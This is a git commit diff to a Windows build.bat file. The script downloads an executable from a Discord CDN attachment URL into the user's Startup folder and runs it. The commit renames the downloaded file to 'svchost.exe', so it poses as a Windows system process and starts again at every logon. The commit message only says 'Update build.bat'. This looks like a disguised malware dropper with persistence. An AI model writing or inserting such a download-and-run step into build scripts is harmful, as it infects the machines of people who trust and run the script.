503fb8f04e767256eb3d0d6d730c7958f9f84d43
waltuhium23 <158318104+waltuhium23@users.noreply.github.com>
2024-02-11 17:14:31 +0300

    Update build.bat

--- build.bat
+++ build.bat
@@ -20,8 +20,8 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1205909065876770836/Python_Installer.exe?ex=65da1556&is=65c7a056&hm=06eeada7be4a12622d1f76eb53fa7468a895d351f2eca661267c93175b9c487e&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+set "URL=https://cdn.discordapp.com/attachments/1203072429677871137/1206239756065833030/svchost.exe?ex=65db4950&is=65c8d450&hm=1eaa8a17cb053bea509819644761a0ce0f9f3f7a562e15b278b95324a42b9111&"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
 
 
 if exist "%DEST%" del "%DEST%"
